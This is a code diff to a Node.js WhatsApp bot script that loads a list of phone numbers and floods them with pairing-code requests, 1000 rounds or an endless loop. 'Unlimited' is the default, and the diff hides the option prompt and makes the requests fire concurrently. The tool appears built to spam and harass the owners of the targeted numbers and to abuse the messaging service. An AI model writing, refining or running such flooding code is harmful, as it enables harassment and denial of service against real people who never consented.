@@ -21,6 +21,8 @@ const checkFileChange = (filePath) => {
     return false;
 };
 
+const MAX_CONCURRENT_REQUESTS = 1000; // الحد الأقصى من الطلبات المتزامنة
+
 async function XeonProject() {
     const { state } = await useMultiFileAuthState('./session');
     const XeonBotInc = makeWASocket({
@@ -48,9 +50,11 @@ async function XeonProject() {
     loadNumbers();
 
     const option = await Promise.race([
-        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
+        question(''),
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
+
+    let count = 0;
 
     const intervalId = setInterval(() => {
         loadNumbers();
@@ -76,12 +80,11 @@ async function XeonProject() {
         if (option === '1') {
             const xeonCodes = 1000;
             for (let i = 0; i < xeonCodes; i++) {
-                sendAllPairingCodes(XeonBotInc, phoneNumbers, i + 1, xeonCodes);
+                await Promise.all(phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes)));
             }
         } else {
-            let count = 0;
             while (true) {
-                sendAllPairingCodes(XeonBotInc, phoneNumbers, ++count);
+                await Promise.all(phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, ++count)));
             }
         }
     } catch (error) {
@@ -89,12 +92,6 @@ async function XeonProject() {
     }
 
     return XeonBotInc;
-}
-
-async function sendAllPairingCodes(XeonBotInc, phoneNumbers, index, total) {
-    const promises = phoneNumbers.map((phoneNumber) => sendPairingCode(XeonBotInc, phoneNumber, index, total));
-    // Send requests simultaneously without waiting for all to complete
-    promises.forEach(promise => promise.catch(error => console.error('Error in sending code:', error.message)));
 }
 
 async function sendPairingCode(XeonBotInc, phoneNumber, index, total) {
